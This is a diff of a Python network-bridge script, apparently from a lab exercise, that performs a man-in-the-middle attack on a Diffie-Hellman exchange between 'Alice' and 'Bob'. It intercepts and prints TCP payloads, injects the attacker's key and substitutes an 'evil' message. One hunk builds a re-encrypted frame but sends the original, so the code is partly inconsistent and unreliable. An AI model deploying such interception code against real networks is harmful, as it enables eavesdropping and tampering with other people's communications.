@@ -54,18 +54,19 @@ Bob_key = bytes()
 
 def create_key(Num:int):
     dh = pow(Num, e, p)
-    return hashlib.sha256(bytes.fromhex(hex(dh))).digest()
+    return hashlib.sha256(bytes.fromhex(hex(dh)[2:])).digest()
 
 def send_datagram(raw_packet, interface):
     try:
         s.bind((interface, 0))
         s.send(raw_packet)
-    except OSError:
-        print(f"Something went wrong with datagram of size {len(raw_packet)}")
+    except OSError as e:
+        print(f"Something went wrong in transmission: {e}")
 
 def handle_spoofed_data(data: bytes) -> bytes:
     try:
         as_string = str(data)
+        print(f"Eevesdropped:{as_string}")
         if as_string == THE_GOOD_MESSAGE:
             data = bytes(MY_EVIL_MESSAGE)
     finally:
@@ -108,31 +109,38 @@ def swapTCPPayloadInEthernetFrame(eth : dpkt.ethernet.Ethernet, data : bytes) ->
 
     return eth2
 
+def is_handshake(tcp: dpkt.tcp.TCP):
+    if tcp.flags & dpkt.tcp.TH_SYN:
+        return True
+    if len(tcp.data) == 0:
+        return True
+    return False
 
 def process_datagram(raw_packet, fromIf):
     global Alice, Alice_IP, Alice_key, Bob, Bob_IP, Bob_key
 
     eth = dpkt.ethernet.Ethernet(raw_packet)
-    toIf = "eth1" if fromIf == "eth0" else "eth1"
+    toIf = "eth1" if fromIf == "eth0" else "eth0"
 
     # Ignore ARP, IPv6 and ICMP
     if not isinstance(eth.data, dpkt.ip.IP) or not eth.type == dpkt.ethernet.ETH_TYPE_IP:
-        subprocess.run(["LED", "R", "SOLID"])
-        print("Got something other than IPv4")
         send_datagram(eth.__bytes__(), toIf)
         return
     ip = eth.data
 
     # Ignore UDP
     if not isinstance(ip.data, dpkt.tcp.TCP) or not ip.p == dpkt.ip.IP_PROTO_TCP:
-        subprocess.run(["LED", "R", "SOLID"])
         send_datagram(eth.__bytes__(), toIf)
         return
     tcp = ip.data
 
     #Ignore Irrelevant communications
     if tcp.sport != listenPort and tcp.dport != listenPort:
-        subprocess.run(["LED", "R", "SOLID"])
+        send_datagram(eth.__bytes__(), toIf)
+        return
+    
+    # IGnore Handshake
+    if is_handshake(tcp):
         send_datagram(eth.__bytes__(), toIf)
         return
     
@@ -148,9 +156,10 @@ def process_datagram(raw_packet, fromIf):
         print("It's hacking time!")
 
         data_bob = format(Eve, "x").encode("utf-8")
+        print(f"Sending {len(data_bob)} bytes to bob")
         eth2 = swapTCPPayloadInEthernetFrame(eth, data_bob)
         send_datagram(eth2.__bytes__(), toIf)
-
+        return
     elif Bob == 0 and Bob_IP == inet_to_str(ip.src):
         Bob_IP = inet_to_str(ip.src)
 
@@ -182,8 +191,8 @@ def process_datagram(raw_packet, fromIf):
         reencrypted = encrypt(data, encrypt_key)
 
         eth2 = swapTCPPayloadInEthernetFrame(eth, reencrypted)
+        send_datagram(eth.__bytes__(), toIf)
         return
-    
     else:
         send_datagram(eth.__bytes__(), toIf)
         return
